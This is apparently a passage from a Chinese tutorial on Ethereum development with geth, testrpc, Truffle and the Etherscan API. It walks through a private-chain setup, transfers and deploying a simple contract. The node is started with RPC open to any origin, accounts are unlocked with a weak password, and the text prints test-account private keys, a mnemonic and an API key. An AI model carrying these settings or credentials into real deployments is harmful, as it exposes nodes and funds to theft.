  "difficulty" : "0x02000000",
  "extraData"  : "",
  "gasLimit"   : "0x2fefd8",
  "nonce"      : "0x0000000000000042",
  "mixhash"    : "0x0000000000000000000000000000000000000000000000000000000000000000",
  "parentHash" : "0x0000000000000000000000000000000000000000000000000000000000000000",
  "timestamp"  : "0x00"
}
```

| 参数名称   | 参数描述                                                     |
| ---------- | ------------------------------------------------------------ |
| mixhash    | 与 nonce 配合用于挖矿                                        |
| nonce      | nonce 就是一个64 位随机数，用于挖矿                          |
| difficulty | 设置当前区块的难度，如果难度过大，cpu 挖矿就很难，这里设置较小难度 |
| alloc      | 用来预置账号以及账号的以太币数量，因为私有链挖矿比较容易，所以我们不需要预置有币的账号，需要的时候自己创建即可以。 |
| coinbase   | 矿工的账号，随便填                                           |
| timestamp  | 设置创世块的时间戳                                           |
| parentHash | 上一个区块的 hash 值，因为是创世块，所以这个值是 0           |
| extraData  | 附加信息，随便填，可以填你的个性信息                         |
| gasLimit   | 该值设置对 gas 的消耗总量限制，用来限制区块能包含的交易信息总和，因为我们是私有链，所以填最大。 |

1. 初始化 `./geth --datadir="./pridata" init genesis.json console`
2. 启动 `./geth --datadir="./pridata" --rpccorsdomain "*" --rpc console`

> **备注：**可以使用开发者模式进行入门学习

```bash
$ ./geth --datadir "./devdata" --dev console
INFO [08-27|22:56:17.394] Maximum peer count                       ETH=25 LES=0 total=25
INFO [08-27|22:56:19.329] Using developer account                  address=0xd3A5A203f58fBe2Eb850C856407Bf7bdFc589965
INFO [08-27|22:56:19.331] Starting peer-to-peer node               instance=Geth/v1.8.13-unstable/windows-amd64/go1.10.1
INFO [08-27|22:56:19.331] Allocated cache and file handles         database=D:\\app\\geth\\devdata\\geth\\chaindata cache=768 handles=1024
INFO [08-27|22:56:19.363] Writing custom genesis block
INFO [08-27|22:56:19.364] Persisted trie from memory database      nodes=11 size=1.71kB time=1ms gcnodes=0 gcsize=0.00B gctime=0s livenodes=1 livesize=0.00B
INFO [08-27|22:56:19.364] Initialised chain configuration          config="{ChainID: 1337 Homestead: 0 DAO: <nil> DAOSupport: false EIP150: 0 EIP155: 0 EIP158: 0 Byzantium: 0 Constantinople: <nil> Engine: clique}"
INFO [08-27|22:56:19.364] Initialising Ethereum protocol           versions="[63 62]" network=1337
INFO [08-27|22:56:19.364] Loaded most recent local header          number=0 hash=8216e1…04a7e0 td=1
INFO [08-27|22:56:19.364] Loaded most recent local full block      number=0 hash=8216e1…04a7e0 td=1
INFO [08-27|22:56:19.364] Loaded most recent local fast block      number=0 hash=8216e1…04a7e0 td=1
INFO [08-27|22:56:19.372] Regenerated local transaction journal    transactions=0 accounts=0
INFO [08-27|22:56:19.373] Starting P2P networking
INFO [08-27|22:56:19.377] started whisper v.6.0
INFO [08-27|22:56:19.378] IPC endpoint opened                      url=\\\\.\\pipe\\geth.ipc
INFO [08-27|22:56:19.378] Transaction pool price threshold updated price=18000000000
INFO [08-27|22:56:19.378] Etherbase automatically configured       address=0xd3A5A203f58fBe2Eb850C856407Bf7bdFc589965
INFO [08-27|22:56:19.378] RLPx listener up                         self="enode://46c65720fd7c7a1c933bf27377356f11322613d58953115dceb2e956e121d511a0264b0dbccaaf46e5c7e90bd49e962ceb226b1329e6bbdc06384abec6fb0f1b@[::]:51502?discport=0"
INFO [08-27|22:56:19.379] Starting mining operation
INFO [08-27|22:56:19.381] Commit new mining work                   number=1 txs=0 uncles=0 elapsed=2.000ms
WARN [08-27|22:56:19.381] Block sealing failed                     err="waiting for transactions"
INFO [08-27|22:56:19.403] Mapped network port                      proto=tcp extport=51502 intport=51502 interface=NAT-PMP(192.168.0.1)
Welcome to the Geth JavaScript console!

instance: Geth/v1.8.13-unstable/windows-amd64/go1.10.1
coinbase: 0xd3a5a203f58fbe2eb850c856407bf7bdfc589965
at block: 0 (Thu, 01 Jan 1970 08:00:00 CST)
 datadir: D:\app\geth\devdata
 modules: admin:1.0 clique:1.0 debug:1.0 eth:1.0 miner:1.0 net:1.0 personal:1.0 rpc:1.0 shh:1.0 txpool:1.0 web3:1.0
```

#### 查看系统变量

- eth：包含一些跟操作区块链相关的方法
- net：包含一些查看 p2p 网络状态的方法
- admin：包含一些与管理节点相关的方法
- miner：包含启动 & 停止挖矿的一些方法
- personal：主要包含一些管理账户的方法
- txpool：包含一些查看交易内存池的方法
- web3：包含了以上对象，还包含一些单位换算的方法

##### eth 全局变量

```javascript
> eth
{
  accounts: ["0x04f14c835b74f79b7def175c4e481929f9800501"],
  blockNumber: 0,
  coinbase: "0x04f14c835b74f79b7def175c4e481929f9800501",
  compile: {
    lll: function(),
    serpent: function(),
    solidity: function()
  },
  defaultAccount: undefined,
  defaultBlock: "latest",
  gasPrice: 1,
  hashrate: 0,
  mining: true,
  pendingTransactions: [],
  protocolVersion: "0x3f",
  syncing: false,
  call: function(),
  contract: function(abi),
  estimateGas: function(),
  filter: function(options, callback, filterCreationErrorCallback),
  getAccounts: function(callback),
  getBalance: function(),
  getBlock: function(),
  getBlockNumber: function(callback),
  getBlockTransactionCount: function(),
  getBlockUncleCount: function(),
  getCode: function(),
  getCoinbase: function(callback),
  getCompilers: function(),
  getGasPrice: function(callback),
  getHashrate: function(callback),
  getMining: function(callback),
  getPendingTransactions: function(callback),
  getProtocolVersion: function(callback),
  getRawTransaction: function(),
  getRawTransactionFromBlock: function(),
  getStorageAt: function(),
  getSyncing: function(callback),
  getTransaction: function(),
  getTransactionCount: function(),
  getTransactionFromBlock: function(),
  getTransactionReceipt: function(),
  getUncle: function(),
  getWork: function(),
  iban: function(iban),
  icapNamereg: function(),
  isSyncing: function(callback),
  namereg: function(),
  resend: function(),
  sendIBANTransaction: function(),
  sendRawTransaction: function(),
  sendTransaction: function(),
  sign: function(),
  signTransaction: function(),
  submitTransaction: function(),
  submitWork: function()
}
```

##### personal 变量

```javascript
> personal
{
  listAccounts: ["0x04f14c835b74f79b7def175c4e481929f9800501"],
  listWallets: [{
      accounts: [{...}],
      status: "Unlocked",
      url: "keystore:///root/go/src/github.com/ethereum/go-ethereum/build/bin/data/keystore/UTC--2018-07-24T13-02-23.501704460Z--04f14c835b74f79b7def175c4e481929f9800501"
  }],
  deriveAccount: function(),
  ecRecover: function(),
  getListAccounts: function(callback),
  getListWallets: function(callback),
  importRawKey: function(),
  lockAccount: function(),
  newAccount: function github.com/ethereum/go-ethereum/console.(*bridge).NewAccount-fm(),
  openWallet: function github.com/ethereum/go-ethereum/console.(*bridge).OpenWallet-fm(),
  sendTransaction: function(),
  sign: function github.com/ethereum/go-ethereum/console.(*bridge).Sign-fm(),
  signTransaction: function(),
  unlockAccount: function github.com/ethereum/go-ethereum/console.(*bridge).UnlockAccount-fm()
}
```

##### miner 变量

```javascript
> miner
{
  getHashrate: function(),
  setEtherbase: function(),
  setExtra: function(),
  setGasPrice: function(),
  start: function(),
  stop: function()
}
```

#### 基础操作

##### 查看节点信息

```javascript
> admin.nodeInfo
{
  enode: "enode://682e6fc409065786bbb267b14eb29e06fa909b00a32150958bfda45ec589b5fa0c40296cc4e5cefd090d4e4dcfb19a36259154738a95d90ee9e2f0f7f4135fec@0.0.0.0:30303",
  id: "682e6fc409065786bbb267b14eb29e06fa909b00a32150958bfda45ec589b5fa0c40296cc4e5cefd090d4e4dcfb19a36259154738a95d90ee9e2f0f7f4135fec",
  ip: "0.0.0.0",
  listenAddr: "[::]:30303",
  name: "Geth/v1.8.13-unstable/windows-amd64/go1.10.3",
  ports: {
    discovery: 30303,
    listener: 30303
  },
  protocols: {
    eth: {
      config: {
        chainId: 10,
        eip150Hash: "0x0000000000000000000000000000000000000000000000000000000000000000",
        eip155Block: 0,
        eip158Block: 0,
        homesteadBlock: 0
      },
      difficulty: 33554432,
      genesis: "0xbf289100224ae9e27375b93509ff30b7624af5e8ae3eae472e814a2dd6ad1419",
      head: "0xbf289100224ae9e27375b93509ff30b7624af5e8ae3eae472e814a2dd6ad1419",
      network: 1
    }
  }
}
```

##### 查看当前区块高度

```bash
> eth.blockNumber
112
```

##### 查看矿工账户

```bash
> eth.coinbase
"0xce8c956ad62120682999ba6834a9ee88feadf70c"
```

##### 设置矿工账户

```bash
> miner.setEtherbase(eth.accounts[0])
true
```

##### 开启挖矿

> 默认第一个账户得到挖矿收益吗，2 为挖矿占用的 CPU 数量

```bash
> miner.start(2)
null
```

##### 停止挖矿

```bash
> miner.stop()
true
```

> 合并挖矿操作：`miner.start(2); admin.sleepBlocks(1); miner.stop();`

##### 查看系统所有用户

```javascript
> eth.accounts
["0x04f14c835b74f79b7def175c4e481929f9800501"]
```

##### 创建新用户

```javascript
> personal.newAccount('123456')
"0xa5f833dd93979f15d67392ce78ad78829e5a97e1"
> eth.accounts
["0x04f14c835b74f79b7def175c4e481929f9800501", "0xe9db1b66197355d0f05534a53f6b7dcf0c873c76"]
```

创建成功后，会展示创建成功的地址，其中上面的表达式中，中间传入的 123456 为密码 。再次查看系统所有用户，可以看到共有两个用户。

##### 给用户取别名

```javascript
> user1 = eth.accounts[0]
"0x04f14c835b74f79b7def175c4e481929f9800501"
> user2 = eth.accounts[1]
"0xe9db1b66197355d0f05534a53f6b7dcf0c873c76"
> user1
"0x04f14c835b74f79b7def175c4e481929f9800501"
> user2
"0xe9db1b66197355d0f05534a53f6b7dcf0c873c76"
```

操作成功后，用户别名 `user1`、`user2` 已经成功赋值

##### 解锁账户

> 可设置解锁账户持续时间

```javascript
> personal.unlockAccount(user2, '123')
Error: could not decrypt key with given passphrase
> personal.unlockAccount(user2, '123456')
true
> personal.unlockAccount(user2, '123456', 3600)
true
```

为了安全起见，一般一个用户在创建的时候都处于锁定状态，输入密码进行解锁。

如果不解锁，直接对用户操作，例如，对用户转账，则报错如下：

```javascript
> eth.sendTransaction({from:user1, to:user2, value:666})
Error: authentication needed: password or unlock
    at web3.js:3143:20
    at web3.js:6347:15
    at web3.js:5081:36
    at <anonymous>:1:1
```

##### 检查账户余额

```javascript
> eth.getBalance(user1)
1.15792089237316195423570985008687907853269984665640564039457584007913129639927e+77
> eth.getBalance(user2)
0
```

##### 转账

```javascript
> eth.sendTransaction({from:user1, to:user2, value:100})
INFO [07-25|16:58:43.662] Submitted transaction                    fullhash=0x4daf7f1fa1b7c8e8b0c5770fdeaf1d0945782027646399822dbf2a303b1adaaa recipient=0xE9DB1b66197355D0f05534A53F6B7DcF0c873c76
"0x4daf7f1fa1b7c8e8b0c5770fdeaf1d0945782027646399822dbf2a303b1adaaa"
> eth.getBalance(user2)
0
```

转账之后，账户余额仍然没变。此时，需要启动挖矿使交易加入到区块链中。

```javascript
> miner.start()
INFO [07-25|16:58:52.395] Transaction pool price threshold updated price=1
INFO [07-25|16:58:52.395] Starting mining operation
null
> INFO [07-25|16:58:52.396] Commit new mining work                   number=5 txs=1 uncles=0 elapsed=648.142µs
INFO [07-25|16:58:52.397] Successfully sealed new block            number=5 hash=61063d…d19fce
INFO [07-25|16:58:52.398]  mined potential block                  number=5 hash=61063d…d19fce
INFO [07-25|16:58:52.399] Commit new mining work                   number=6 txs=0 uncles=0 elapsed=995.57µs
WARN [07-25|16:58:52.399] Block sealing failed                     err="waiting for transactions"

> eth.getBalance(user2)
100
```

##### 查看交易信息

```javascript
> eth.getTransaction("0x4daf7f1fa1b7c8e8b0c5770fdeaf1d0945782027646399822dbf2a303b1adaaa")
{
  blockHash: "0x61063d921d123682db18107038b813b198306ea7d14c0ff8a1b498e9c5d19fce",
  blockNumber: 5,
  from: "0x04f14c835b74f79b7def175c4e481929f9800501",
  gas: 90000,
  gasPrice: 1,
  hash: "0x4daf7f1fa1b7c8e8b0c5770fdeaf1d0945782027646399822dbf2a303b1adaaa",
  input: "0x",
  nonce: 4,
  r: "0xa812f2601212b123d8932c39b092a4fb46c3467ae51d17237a8034fba847fb73",
  s: "0x21b01335a145ba67778b3ffc991f7c620dff19e693c748118b71537ac55ceb7a",
  to: "0xe9db1b66197355d0f05534a53f6b7dcf0c873c76",
  transactionIndex: 0,
  v: "0xa96",
  value: 100
}
```

##### 查看排队的交易

> 网络原因，或者设置的 `gasPrice` 较低，提交的交易可能存在排队

```javascript
> eth.pendingTransactions
[{
    blockHash: null,
    blockNumber: null,
    from: "0x96d81d81149a3a8501eb99fb8aca1cff5cc19d7c",
    gas: 90000,
    gasPrice: 4000000000,
    hash: "0xed4e7b61c2708f35f686269cfc5dd6e2f461126622416d418d84c89209cde042",
    input: "0x",
    nonce: 15,
    r: "0x8641968a94754bf4e90be44633d8da00442539dffc0bed97440c861480d0b3fa",
    s: "0x45048590631c45ae8b129cbc4023750a0e84ff0f0b9a6d87739ffcce93b317b",
    to: "0x9ecaaf6f3bc5cfaf596ff8317e2ccd688ca40bd7",
    transactionIndex: 0,
    v: "0x2a",
    value: 458000680855715200000
}]
> eth.getTransactionCount(eth.accounts[0],"pending")
15
```

#### 合约

##### 编写 Solidity 合约脚本

```javascript
pragma solidity ^0.4.11;

contract Sample {

    uint public value;

    constructor (uint v) public {
        value = v;
    }

    function set(uint v) public {
        value = v;
    }

    function get() public view returns (uint) {
        return value;
    }
}
```

##### 编译合约

> 利用 `solc` 编译合约，生成 ABI 接口和合约的二进制代码，也可利用 [Remix](https://remix.ethereum.org) 在线编译合约

```bash
root:ethereum# solc --optimize --abi --bin sample.sol

======= sample.sol:Sample =======
Binary:
608060405234801561001057600080fd5b50604051602080610114833981016040525160005560e1806100336000396000f30060806040526004361060525763ffffffff7c01000000000000000000000000000000000000000000000000000000006000350416633fa4f2458114605757806360fe47b114607b5780636d4ce63c146092575b600080fd5b348015606257600080fd5b50606960a4565b60408051918252519081900360200190f35b348015608657600080fd5b50609060043560aa565b005b348015609d57600080fd5b50606960af565b60005481565b600055565b600054905600a165627a7a723058207098d9dc5ae86fe75d1016078954658c002f112da516ed90f64c901feb340d870029
Contract JSON ABI
[{"constant":true,"inputs":[],"name":"value","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"v","type":"uint256"}],"name":"set","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"get","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[{"name":"v","type":"uint256"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"}]
```

##### 定义合约

```javascript
> abi = [{"constant":true,"inputs":[],"name":"value","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"v","type":"uint256"}],"name":"set","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"get","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[{"name":"v","type":"uint256"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"}]
[{
    constant: true,
    inputs: [],
    name: "value",
    outputs: [{
        name: "",
        type: "uint256"
    }],
    payable: false,
    stateMutability: "view",
    type: "function"
}, {
    constant: false,
    inputs: [{
        name: "v",
        type: "uint256"
    }],
    name: "set",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function"
}, {
    constant: true,
    inputs: [],
    name: "get",
    outputs: [{
        name: "",
        type: "uint256"
    }],
    payable: false,
    stateMutability: "view",
    type: "function"
}, {
    inputs: [{
        name: "v",
        type: "uint256"
    }],
    payable: false,
    stateMutability: "nonpayable",
    type: "constructor"
}]
> sample = eth.contract(abi)
{
  abi: [{
      constant: true,
      inputs: [],
      name: "value",
      outputs: [{...}],
      payable: false,
      stateMutability: "view",
      type: "function"
  }, {
      constant: false,
      inputs: [{...}],
      name: "set",
      outputs: [],
      payable: false,
      stateMutability: "nonpayable",
      type: "function"
  }, {
      constant: true,
      inputs: [],
      name: "get",
      outputs: [{...}],
      payable: false,
      stateMutability: "view",
      type: "function"
  }, {
      inputs: [{...}],
      payable: false,
      stateMutability: "nonpayable",
      type: "constructor"
  }],
  eth: {
    accounts: ["0x96d81d81149a3a8501eb99fb8aca1cff5cc19d7c", "0x4c84487c52bfe27c8163d7728a3d3beb2927b57b", "0x273ff2cb17b58ff9af92bbc6382a15b9909401e2", "0x7290ea5a3475f50189123199a8e3a2801a1892a3", "0xefaa9f7b0e060b9e3d57c273b757522fd5a3e664", "0xe379d8f62f07bfd179eb8c071f1d63af3affee2c"],
    blockNumber: 4335201,
    coinbase: "0x96d81d81149a3a8501eb99fb8aca1cff5cc19d7c",
    compile: {
      lll: function(),
      serpent: function(),
      solidity: function()
    },
    defaultAccount: undefined,
    defaultBlock: "latest",
    gasPrice: 3000000000,
    hashrate: 0,
    mining: true,
    pendingTransactions: [],
    protocolVersion: "0x3f",
    syncing: false,
    call: function(),
    contract: function(abi),
    estimateGas: function(),
    filter: function(options, callback, filterCreationErrorCallback),
    getAccounts: function(callback),
    getBalance: function(),
    getBlock: function(),
    getBlockNumber: function(callback),
    getBlockTransactionCount: function(),
    getBlockUncleCount: function(),
    getCode: function(),
    getCoinbase: function(callback),
    getCompilers: function(),
    getGasPrice: function(callback),
    getHashrate: function(callback),
    getMining: function(callback),
    getPendingTransactions: function(callback),
    getProtocolVersion: function(callback),
    getRawTransaction: function(),
    getRawTransactionFromBlock: function(),
    getStorageAt: function(),
    getSyncing: function(callback),
    getTransaction: function(),
    getTransactionCount: function(),
    getTransactionFromBlock: function(),
    getTransactionReceipt: function(),
    getUncle: function(),
    getWork: function(),
    iban: function(iban),
    icapNamereg: function(),
    isSyncing: function(callback),
    namereg: function(),
    resend: function(),
    sendIBANTransaction: function(),
    sendRawTransaction: function(),
    sendTransaction: function(),
    sign: function(),
    signTransaction: function(),
    submitTransaction: function(),
    submitWork: function()
  },
  at: function(address, callback),
  getData: function(),
  new: function()
}
```

##### 把合约代码部署上链

> 合约部署上链（以太坊测试网络）时，给构造函数传参  99，即赋初值 99

```javascript
> thesample = sample.new(99, {from:eth.accounts[0], data:hex, gas:3000000})
{
  abi: [{
      constant: true,
      inputs: [],
      name: "value",
      outputs: [{...}],
      payable: false,
      stateMutability: "view",
      type: "function"
  }, {
      constant: false,
      inputs: [{...}],
      name: "set",
      outputs: [],
      payable: false,
      stateMutability: "nonpayable",
      type: "function"
  }, {
      constant: true,
      inputs: [],
      name: "get",
      outputs: [{...}],
      payable: false,
      stateMutability: "view",
      type: "function"
  }, {
      inputs: [{...}],
      payable: false,
      stateMutability: "nonpayable",
      type: "constructor"
  }],
  address: undefined,
  transactionHash: "0x62a76049a23ed43c2a805b5852ee743f4bf9e2274fcc9bb685a42327f7659308"
}
```

##### 查看交易细节

> 根据交易 hash 查看交易细节

```javascript
> samplerecpt = eth.getTransactionReceipt("0x62a76049a23ed43c2a805b5852ee743f4bf9e2274fcc9bb685a42327f7659308")
{
  blockHash: "0xc6a60ac6e3f290378102c1d6b7676be5a59015d92c6b670468fa90f18a602490",
  blockNumber: 4335203,
  contractAddress: "0xe9a29710d25e0819444d11ba75fecf11fefb3411",
  cumulativeGasUsed: 160022,
  from: "0x96d81d81149a3a8501eb99fb8aca1cff5cc19d7c",
  gasUsed: 134093,
  logs: [],
  logsBloom: "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
  status: "0x1",
  to: null,
  transactionHash: "0x62a76049a23ed43c2a805b5852ee743f4bf9e2274fcc9bb685a42327f7659308",
  transactionIndex: 1
}
```

![](pic/blockchain/deploy_contract.png)

##### 合约命名

> 交易信息中，contractAddress 表示合约地址

``` javascript
> samplecontract = sample.at("0xe9a29710d25e0819444d11ba75fecf11fefb3411")
{
  abi: [{
      constant: true,
      inputs: [],
      name: "value",
      outputs: [{...}],
      payable: false,
      stateMutability: "view",
      type: "function"
  }, {
      constant: false,
      inputs: [{...}],
      name: "set",
      outputs: [],
      payable: false,
      stateMutability: "nonpayable",
      type: "function"
  }, {
      constant: true,
      inputs: [],
      name: "get",
      outputs: [{...}],
      payable: false,
      stateMutability: "view",
      type: "function"
  }, {
      inputs: [{...}],
      payable: false,
      stateMutability: "nonpayable",
      type: "constructor"
  }],
  address: "0x1ce836d1d1839f1ed07b01ae152a4c5f0ee2a041",
  transactionHash: null,
  allEvents: function(),
  get: function(),
  set: function(),
  value: function()
}
```

##### 执行合约 get 函数

```javascript
> samplecontract.get.call()
99
```

##### 执行合约 set 函数

```javascript
> samplecontract.set.sendTransaction(1001, {from:eth.accounts[0], gas:3000000})
"0x528209c6bcdbbb4a636eebd90cfc918eb8e463fed1f0cb3bbd8ef19df0654808"
```

##### 执行合约 get 函数

```javascript
> samplecontract.get.call()
1001
```

### 以太坊开发基础

> **基础环境：**NPM v5.6.0/nodejs v8.11.3
>

#### web3

> `web3.js` 是一个通过 [RPC 调用](https://github.com/ethereum/wiki/wiki/JSON-RPC) 和本地以太坊节点进行通信的 js 库

> `web3.js` 可以与任何暴露了 RPC 接口的以太坊节点连接。 `web3` 中提供了 `eth` 对象 `web3.eth` 来与以太坊区块链进行交互

```bash
npm install -g web3@0.20.1
```

> web3 不同版本接口不兼容，根据需要安装对应版本

#### testrpc

> `ethereumjs-testrpc` 库后续被重命名为 `Ganache CLI`

> `testrpc` 不同于 `geth`，`geth` 是真正的以太坊环境，`testrpc` 是在本地使用内存模拟的一个以太坊环境，对于开发调试来说，更为方便快捷，当合约在 `testrpc` 中测试通过后，再部署到测试网络或主网络

```bash
root:~#  npm install -g ethereumjs-testrpc
npm WARN deprecated ethereumjs-testrpc@6.0.3: ethereumjs-testrpc has been renamed to ganache-cli, please use this package from now on.
/usr/local/bin/testrpc -> /usr/local/lib/node_modules/ethereumjs-testrpc/build/cli.node.js
npm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@1.2.4 (node_modules/ethereumjs-testrpc/node_modules/fsevents):
npm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform for fsevents@1.2.4: wanted {"os":"darwin","arch":"any"} (current: {"os":"linux","arch":"x64"})
+ ethereumjs-testrpc@6.0.3
updated 1 package in 11.83s
```

> 运行 testrpc 之后自动创建 10 个账户，每个账户默认有 100 个以太币

> 可指定运行参数，例如设置 gaslimit、出块时间 `testrpc --gasLimit 0x800000000 -b 2`

```bash
root:~# testrpc
EthereumJS TestRPC v6.0.3 (ganache-core: 2.0.2)

Available Accounts
==================
(0) 0x931a85a8b24e00e5aa56651a64dd55f3c849fe14
(1) 0x7a74f95c7b520f498b31fedcbffaa9a1b12a7dea
(2) 0xe4ef6200839fd673eb1dd42db3842bb4cbf1450b
(3) 0x9444971ba35b6dcbca9909021cb6463902940dc6
(4) 0x79d39a05ec5afda98ccd435ba0124de32a186619
(5) 0xeaef1169fdb348b44efe860228666a35f2a33476
(6) 0xb7e4e662bf202c16c4d2e6c9b8254f3dc771f9b2
(7) 0xf887537611c4f20b788c0448e912e29cbc46e398
(8) 0x33687b265c9910ae865334735959f9d02c874db2
(9) 0x20587c3c3609c4cd954364c828b85077d68357cd

Private Keys
==================
(0) d59b0b9f2cc918597b558612f77f04bb78caf385f98f9787b83fa7d449328bdd
(1) a701c5a389856323e88bcc835f7e683ab606c221e9144c7d132605a52517ef79
(2) 0d08de4f3212a674520501828530c5d8ed39af5c029f0bae7c24a0edebf84d35
(3) a9b94d7dc5320cce54e8fedc4c527ddcdeb8140345f85fe65a68578535b67299
(4) a042e22f82b374e5d1ae439da7a7b326a22301fb42477e3136affd71c84e67fb
(5) d871bfcd1325ab085ffe692aa3d2ab9259c5078c2031f83631b32e3ee614864a
(6) 750077fca5e502678fcfc60dae7392d0bb4545a7b669da5dd0792dd40bb01143
(7) cd841189444d94bf833ba626415e519b06048bde7473da53c5a93995859edab2
(8) c41aa3c25c07926f1b36a9b2c004007e7978d1668bb891c1085e1f0e2aa18703
(9) eafa58b497de55316ec4502891447312577bd186ca8857bb90c321c6939c3cf7

HD Wallet
==================
Mnemonic:      park invite try clap airport summer armed relax split humble unique black
Base HD Path:  m/44'/60'/0'/0/{account_index}

Listening on localhost:8545
```

#### truffle

> `Truffle` 是最流行的开发框架，能够在本地编译、部署智能合约，使命是让开发更容易；`Truffle` 需要以太坊客户端支持，需要支持标准的 `JSON RPC API`

> truffle 集成了 web3.js（可能使用较低版本的 web3.js，与最新版本的 web3.js 接口、语法可能存在不兼容）

> 可指定安装版本，如 `npm install -g truffle@4.0.0`

```bash
npm install -g truffle
```

### 以太坊 Truffle、TestRPC 开发基础

> **基础环境：**EthereumJS TestRPC v6.0.3 (ganache-core: 2.0.2)/Truffle v4.1.14 (core: 4.1.14)/Solidity v0.4.24 (solc-js)

#### 启动 TestRPC 服务

```bash
$ testrpc --gasLimit 0x800000000 -b 2
```

#### 新建 Truffle 工程，并初始化

```bash
Administrator@USER-20180502AZ MINGW64 /e
$ mkdir project

Administrator@USER-20180502AZ MINGW64 /e
$ cd project/

Administrator@USER-20180502AZ MINGW64 /e/project
$ truffle init
Downloading...
Unpacking...
Setting up...
Unbox successful. Sweet!

Commands:

  Compile:        truffle compile
  Migrate:        truffle migrate
  Test contracts: truffle test

Administrator@USER-20180502AZ MINGW64 /e/project
$ ls
contracts/  migrations/  test/  truffle.js  truffle-config.js
```

> 在 Windows 下，删除 `truffle.js`，否则有 `truffle-config.js` 重定义问题

- `contracts` 智能合约目录
- `migrations` 发布脚本目录
- `test` 存放测试文件
- `truffle.js` Truffle的配置文件

修改 `truffle-config.js` 文件，内容如下

```javascript
module.exports = {
  networks: {
    development: {
      host: "localhost",
      port: 8545,
      network_id: "*" // Match any network id
    }
  }
};
```

#### 开发、编译、部署合约

在 `contracts` 编写业务合约 `MyStringStore.sol`；在 `migrations` 添加 `2_deploy_contracts.js`

```javascript
pragma solidity ^0.4.24;

contract MyStringStore {
  string public myString = "Hello World";

  function set(string x) public {
    myString = x;
  }
}
```

```javascript
const MyStringStore = artifacts.require("MyStringStore");

module.exports = function(deployer) {
  deployer.deploy(MyStringStore);
};
```

编译合约

> `Truffle` 仅默认编译自上次编译后被修改过的文件，来减少不必要的编译。如果你想编译全部文件，可以使用  `--compile-all` 选项

```bash
$ truffle compile
Compiling .\contracts\MyStringStore.sol...
Writing artifacts to .\build\contracts
```

部署合约

```bash
$ truffle migrate
Using network 'development'.

Running migration: 1_initial_migration.js
  Deploying Migrations...
  ... 0xb16a8c6e246282b1ca26bfce789a644b6aeea521cf4f06bf7df1d23532efbb23
  Migrations: 0x8751b4eb379270fb2de09d275718ce75886d133d
Saving successful migration to network...
  ... 0x66e6fe95b27922fca5bba4bbda3c4aa32d729acfea2f15378cfe76e925ffecd7
Saving artifacts...
Running migration: 2_deploy_contracts.js
  Deploying MyStringStore...
  ... 0x20de9b4d058bc6c64011b9f2dc6e1d8c349248800a93a95c7dca3f4dc58f4345
  MyStringStore: 0xae238f7c54991a083b1fd318160bf22de3bba4d1
Saving successful migration to network...
  ... 0x8fc33d16aacb8c0d53d96f5641937a512cd6eaf71429a9b8000495fb54604daf
Saving artifacts...
```

#### 测试合约

在目录 `test` 编写测试用例文件 `MyStringStore.js`

```javascript
const MyStringStore = artifacts.require("./MyStringStore.sol");

contract("MyStringStore", accounts => {
  it("should store the string 'Hey there!'", async () => {
    const myStringStore = await MyStringStore.deployed();

    // Set myString to "Hey there!"
    await myStringStore.set("Hey there!", { from: accounts[0] });

    // Get myString from public variable getter
    const storedString = await myStringStore.myString.call();

    assert.equal(storedString, "Hey there!", "The string was not stored");
  });
});
```

执行测试用例

```bash
$ truffle test
Using network 'development'.



  Contract: MyStringStore
    √ should store the string 'Hey there!' (2073ms)


  1 passing (2s)

```

> 部署、测试合约过程中，可以查看 `TestRPC` 输出窗口

![](pic/blockchain/truffle_output.png)

### 以太坊第三方开放 API

> 本地不部署节点，利用第三方开放 API 开发自身的业务

#### 官方社区

> 详见 [https://etherscan.io/apis](https://etherscan.io/apis)，以太坊社区提供的无需授权的服务，但是请求频率限制比较严，5 Request/Second，且 API 只支持主网

首先，申请 `Access Token`

![](pic/blockchain/access_token.png)

然后，调用对应的接口即可，如，获取事件日志

```bash
root@ubuntu:~# curl 'https://api.etherscan.io/api?module=logs&action=getLogs&fromBlock=1668250&toBlock=latest&address=0x33990122638b9132ca29c723bdf037f1a891a70c&topic0=0xf63780e752c6a54a94fc52715dbc5518a3b4c3c2833d301a204226548a2a8545&apikey=NDWT8M75DHHBBB5NBY41G2ZWAXIP3S58D6'
{"status":"1","message":"OK","result":[{"address":"0x33990122638b9132ca29c723bdf037f1a891a70c","topics":["0xf63780e752c6a54a94fc52715dbc5518a3b4c3c2833d301a204226548a2a8545","0x616c656300000000000000000000000000000000000000000000000000000000","0x00000000000000000000000021641fa7efc05e776da24d7e1046e68b2dd09adf"],"data":"","blockNumber":"0x19749b","timeStamp":"0x57587a9f","gasPrice":"0x4a817c800","gasUsed":"0xca6a","logIndex":"0x3","transactionHash":"0xbb60625e9c4df3cd1c66f77fb673e478c81b58deccb182da09a0258c8940285c","transactionIndex":"0x5"},{"address":"0x33990122638b9132ca29c723bdf037f1a891a70c","topics":["0xf63780e752c6a54a94fc52715dbc5518a3b4c3c2833d301a204226548a2a8545","0x636f696e38362e6f726700000000000000000000000000000000000000000000","0x00000000000000000000000005b71e90d9f3da4d8b61484560df89063f398fc9"],"data":"0x","blockNumber":"0x2399ec","timeStamp":"0x57e9bb5c","gasPrice":"0xba43b7400","gasUsed":"0x10682","logIndex":"0x","transactionHash":"0x980742edcf7b5cc9e1fdb2ddd71df20a176454c09be50dd2ac8231831f1d78a5","transactionIndex":"0x"}]}
```

对应地，以太坊区块链浏览器信息如下
